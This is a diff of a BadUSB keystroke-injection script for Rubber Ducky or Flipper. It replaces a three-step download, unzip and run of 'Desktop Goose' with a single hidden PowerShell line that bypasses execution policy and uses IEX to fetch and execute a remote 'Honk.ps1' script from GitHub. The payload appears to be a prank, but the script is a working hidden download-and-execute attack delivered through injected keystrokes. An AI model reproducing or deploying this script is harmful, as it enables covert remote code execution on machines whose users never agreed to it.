@@ -1,15 +1,6 @@
-DELAY 1000
+REM Open Run Box
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -ep bypass -c iwr -Uri "https://raw.githubusercontent.com/csandoval63/GooseDesktopRubberDucky/6f58ce98040f7904d934f3a376b491dab45dcd22/Desktop%20Goose%20v0.21.zip" -OutFile "$env:TEMP\H.zip";
-ENTER
-DELAY 10000
-GUI r
-DELAY 500
-STRING powershell -WindowStyle Hidden -ep bypass -c Expand-Archive "$env:TEMP\H.zip" -Dest "$env:TEMP\H" -Force;
-ENTER
-REM DELAY 500
-GUI r
-DELAY 500
-STRING powershell -WindowStyle Hidden -ep bypass -c (New-Object -ComObject Shell.Application).ShellExecute("$env:TEMP\H\GooseDesktop.exe")
+REM Download and Execute in one hidden line
+STRING powershell -w h -ep bypass -c "IEX (iwr 'https://raw.githubusercontent.com/J-Reboia/TheFunHouse/refs/heads/main/Flipper/BadUsb/Honk/Honk.ps1').Content"
 ENTER
